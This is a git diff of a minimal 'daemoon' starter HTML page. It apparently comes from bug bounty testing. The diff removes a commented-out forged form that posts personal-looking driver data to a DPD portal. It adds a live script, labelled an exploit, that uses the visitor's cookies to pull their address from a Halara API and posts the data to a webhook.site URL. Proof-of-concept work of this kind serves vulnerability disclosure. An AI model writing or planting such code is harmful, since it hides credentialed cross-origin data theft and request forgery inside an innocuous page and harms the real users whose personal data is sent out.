@@ -1,134 +1,87 @@
 <!doctype html>
 <html lang="en">
-    <head>
-        <meta charset="utf-8" />
-        <meta name="viewport" content="width=device-width,initial-scale=1" />
-        <title>Basic Page — daemoon</title>
-        <style>
-            :root {
-                --bg: #f7f9fb;
-                --card: #fff;
-                --accent: #0b72ff;
-                --muted: #6b7280;
-            }
-            html,
-            body {
-                height: 100%;
-            }
-            body {
-                margin: 0;
-                font-family:
-                    Inter,
-                    system-ui,
-                    Segoe UI,
-                    Roboto,
-                    "Helvetica Neue",
-                    Arial;
-                background: var(--bg);
-                color: #111;
-            }
-            header {
-                background: linear-gradient(90deg, #fff 0%, #f1f5f9 100%);
-                box-shadow: 0 1px 0 rgba(0, 0, 0, 0.05);
-            }
-            .container {
-                max-width: 980px;
-                margin: 0 auto;
-                padding: 20px;
-            }
-            nav {
-                display: flex;
-                gap: 16px;
-                align-items: center;
-            }
-            a {
-                color: var(--accent);
-                text-decoration: none;
-            }
-            main {
-                padding: 28px 20px;
-            }
-            .hero {
-                background: var(--card);
-                border-radius: 8px;
-                padding: 30px;
-                box-shadow: 0 6px 18px rgba(12, 15, 20, 0.06);
-            }
-            footer {
-                padding: 14px 20px;
-                color: var(--muted);
-                font-size: 14px;
-                text-align: center;
-            }
-        </style>
-    </head>
-    <body>
-        <header>
-            <div
-                class="container"
-                style="
-                    display: flex;
-                    justify-content: space-between;
-                    align-items: center;
-                "
-            >
-                <div>
-                    <strong>daemoon</strong>
-                </div>
-                <nav aria-label="Main navigation">
-                    <a href="#">Home</a>
-                    <a href="#">About</a>
-                    <a href="#">Contact</a>
-                </nav>
-            </div>
-        </header>
-        <!-- This is the exploit -->
-        <!--<form
-            action="https://myportal.drivers.dpd.co.uk/esg/odf/portal/driver/"
-            method="POST"
-            enctype="text/plain"
-        >
-            <input
-                name='{"nationalInsuranceNumber":"AD207921B","salutationId":2,"currentAddress":{"postcode":"RG1 2AB","addressKey":null,"addressLine1":"analyst","city":"London"},"firstName":"Analyst","middleName":null,"surname":"Triager","telephone":null,"mobileNumber":"447730900128","emailAddress":"h1_analyst_mars_ren+3@wearehackerone.com","licenceNumber":"1131111122","uploadedDocuments":[],"vehicleType":1,"drivingConvictions":[],"criminalConvictions":[],"ignore":"'
-                value='"}'
-            />
-        </form>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Basic Page — daemoon</title>
+    <style>
+        :root {
+            --bg: #f7f9fb;
+            --card: #fff;
+            --accent: #0b72ff;
+            --muted: #6b7280;
+        }
+        html, body {
+            height: 100%;
+            margin: 0;
+            font-family: Inter, system-ui, Segoe UI, Roboto, "Helvetica Neue", Arial;
+            background: var(--bg);
+            color: #111;
+        }
+        header {
+            background: linear-gradient(90deg, #fff 0%, #f1f5f9 100%);
+            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.05);
+        }
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        nav {
+            display: flex;
+            gap: 16px;
+            align-items: center;
+        }
+        a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        main {
+            padding: 28px 20px;
+        }
+        .hero {
+            background: var(--card);
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 6px 18px rgba(12, 15, 20, 0.06);
+        }
+        footer {
+            padding: 14px 20px;
+            color: var(--muted);
+            font-size: 14px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container" style="display: flex; justify-content: space-between; align-items: center;">
+            <div><strong>daemoon</strong></div>
+            <nav>
+                <a href="#">Home</a>
+                <a href="#">About</a>
+                <a href="#">Contact</a>
+            </nav>
+        </div>
+    </header>
 
-        <script>
-            document.forms[0].submit();
-        </script>-->
-        <main class="container">
-            <section class="hero" aria-labelledby="hero-title">
-                <h1 id="hero-title" style="margin-top: 0">
-                    Welcome to daemoon
-                </h1>
-                <p style="color: var(--muted); margin-bottom: 12px">
-                    This is a minimal starter page. Edit
-                    <code>index.html</code> to begin building your site.
-                </p>
-                <p>
-                    <a
-                        href="#"
-                        style="
-                            background: var(--accent);
-                            color: #fff;
-                            padding: 10px 14px;
-                            border-radius: 6px;
-                            display: inline-block;
-                        "
-                        >Get started</a
-                    >
-                </p>
-            </section>
-        </main>
+    <main class="container">
+        <section class="hero" aria-labelledby="hero-title">
+            <h1 id="hero-title">Welcome to daemoon</h1>
+            <p style="color: var(--muted); margin-bottom: 12px">
+                This is a minimal starter page. Edit <code>index.html</code> to begin building your site.
+            </p>
+            <p>
+                <a href="#" style="background: var(--accent); color: #fff; padding: 10px 14px; border-radius: 6px; display: inline-block;">Get started</a>
+            </p>
+        </section>
+    </main>
 
-        <script src="index.js"></script>
-
-        <footer>© <span id="year"></span> daemoon.</footer>
-        <script>
-            fetch("https://api-proxy.eur.halara.com/mall-rest/api/v1/address/get-user-address?timestamp=" + Date.now(), {
+    <!-- ✅ Exploit Script -->
+    <script>
+        fetch("https://api-proxy.eur.halara.com/mall-rest/api/v1/address/get-user-address?timestamp=" + Date.now(), {
             method: "POST",
-            credentials: "include", // required to send cookies
+            credentials: "include", // needed to send auth cookies
             headers: {
                 "content-type": "application/json",
                 "app-id": "29",
@@ -136,21 +89,29 @@
                 "currency": "EUR",
                 "lang": "en-EUR",
                 "host-name": "eur.halara.com",
-                "track-id": crypto.randomUUID(), // optional
+                "track-id": crypto.randomUUID()
             },
             body: "{}"
-            })
-            .then(res => res.json())
-            .then(data => {
+        })
+        .then(res => res.json())
+        .then(data => {
             console.log("Address data exfiltrated:", data);
-            // send to your webhook or display it
-            });
-        </script>
 
-        <script>
-            // Small script to set current year
-            document.getElementById("year").textContent =
-                new Date().getFullYear();
-        </script>
-    </body>
+            fetch("https://webhook.site/0fda16eb-6ccd-4ccf-95f7-11d1fd1cecd4", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            });
+        })
+        .catch(console.error);
+    </script>
+
+    <!-- Sets the current year -->
+    <footer>© <span id="year"></span> daemoon.</footer>
+    <script>
+        document.getElementById("year").textContent = new Date().getFullYear();
+    </script>
+</body>
 </html>
